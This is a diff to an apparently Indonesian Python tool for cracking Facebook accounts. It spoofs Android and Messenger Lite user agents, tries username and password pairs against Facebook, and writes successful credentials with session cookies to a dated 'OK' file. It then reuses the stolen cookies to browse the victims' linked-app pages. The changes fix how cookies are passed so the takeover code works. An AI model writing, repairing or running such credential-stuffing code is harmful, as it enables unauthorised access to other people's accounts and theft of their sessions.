@@ -52,7 +52,7 @@ for z in range(200):
 	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
 	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
 	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; LG-F320L Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
-	#ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; U FEEL LITE Build/MRA58K) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/155323366;FBDM/"+"{density=2.0,width=720,height=1360};"+f"FBLC/en_US;FBRV/156625696;FBCR/mt:s;FBMF/Wiko U Feel Lite;FBBD/Wiko U Feel Lite;FBPN/com.facebook.mlite;FBDV/U FEEL LITE;FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+	#ua = f"Dalvik/2.1.0 (Linux; U; Android ios13; iPhone Build/MRA58K) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/155323366;FBDM/"+"{density=2.0,width=720,height=1360};"+f"FBLC/en_US;FBRV/156625696;FBCR/mt:s;FBMF/iPhone;FBBD/iPhone;FBPN/com.facebook.mlite;FBDV/iPhone;FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 #[FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/193013937;FBDM/"+"{density=2.625,width=1080,height=1794};"+f"FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.mlite;FBDV/Pixel 2;FBSV/{versi_android};FBBK/1;FBOP/1;FBCA/arm64-v8a:;
 #FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 #[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
@@ -120,7 +120,7 @@ class Login:
 			else:
 				for z in url.find_all("a",href=True):
 					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
+						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
 						parsing = parser(get.text,"html.parser")
 						action = parsing.find("form",{"method":"post"})["action"]
 						data = {
@@ -128,7 +128,7 @@ class Login:
 							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
 							"submit": "OK, Gunakan Data"
 						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
+						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
 						break
 			open("data/cookie","w").write(cookie)
 			Menu().menu()
@@ -531,8 +531,8 @@ class Crack:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 							prints(tree)
-							open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
-							break
+						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
+						break
 				elif "User must verify their account" in post.text:
 					user = post.json()["error"]["error_data"]["uid"]
 					if user in self.ok or user in self.cp:
@@ -570,7 +570,7 @@ class Crack:
 			else:
 				for z in url.find_all("a",href=True):
 					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies=cookie)
+						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
 						parsing = parser(get.text,"html.parser")
 						action = parsing.find("form",{"method":"post"})["action"]
 						data = {
@@ -578,7 +578,7 @@ class Crack:
 							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
 							"submit": "OK, Gunakan Data"
 						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies=cookie)
+						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
 						break
 		except:pass
 
@@ -610,7 +610,7 @@ class Crack:
 	###----------[ GET APK AKTIF ]---------- ###
 	def apkaktif(self,url,cookie):
 		try:
-			data = parser(ses.get(url,cookies=cookie).text,"html.parser")
+			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
 			for apk in data.find_all("h3"):
 				if "Ditambahkan" in apk.text:
 					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
@@ -622,7 +622,7 @@ class Crack:
 	###----------[ GET APK KADALUWARSA ]---------- ###
 	def apkkadaluwarsa(self,url,cookie):
 		try:
-			data = parser(ses.get(url,cookies=cookie).text,"html.parser")
+			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
 			for apk in data.find_all("h3"):
 				if "Kedaluwarsa" in apk.text:
 					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
